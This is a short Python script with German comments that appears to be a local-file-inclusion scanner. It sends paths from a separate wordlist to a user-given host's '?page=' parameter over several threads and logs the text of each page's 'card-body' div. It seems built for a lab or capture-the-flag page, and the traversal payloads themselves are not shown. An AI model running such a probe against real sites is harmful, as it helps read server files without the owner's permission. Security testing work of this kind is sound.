import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

URL = input("URL : ")
BASE_URL = f"http://{URL}/?page="
WORDLIST_PATH = "wordlist.txt"
LOGFILE = "lfi_scan_results.txt"
MAX_THREADS = 10
lock = threading.Lock()

def load_wordlist(path: str) -> list:
    """Lädt Pfade aus der Wortliste und ignoriert Kommentare und leere Zeilen."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    except FileNotFoundError:
        print(f"[!] Fehler: Die Datei '{path}' wurde nicht gefunden.")
        return []

def fetch_card_body_content(url: str) -> str:
    """Sendet eine HTTP-Anfrage und extrahiert den Inhalt aus <div class='card-body'>."""
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        card_body = soup.find("div", class_="card-body")
        return card_body.get_text(strip=True) if card_body else "[<div class='card-body'> nicht gefunden]"
    except requests.RequestException as e:
        return f"[Fehler bei HTTP-Anfrage: {e}]"

def scan_path(path: str) -> str:
    """Führt einen Scan für einen einzelnen Pfad durch."""
    target_url = BASE_URL + path
    content = fetch_card_body_content(target_url)
    result = f"[*] Teste: {target_url}\n[+] Antwort:\n{content}\n{'-'*60}\n"
    
    # Thread-sicheres Schreiben in Logdatei
    with lock:
        with open(LOGFILE, "a", encoding="utf-8") as log_file:
            log_file.write(result)
    return result

def perform_lfi_scan():
    paths = load_wordlist(WORDLIST_PATH)
    if not paths:
        return
    
    # Logdatei zu Beginn leeren/überschreiben
    with open(LOGFILE, "w", encoding="utf-8") as log_file:
        log_file.write("LFI Scan Ergebnisse\n====================\n\n")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(scan_path, path) for path in paths]
        for future in as_completed(futures):
            # Ausgabe in Konsole
            print(future.result())

if __name__ == "__main__":
    perform_lfi_scan()
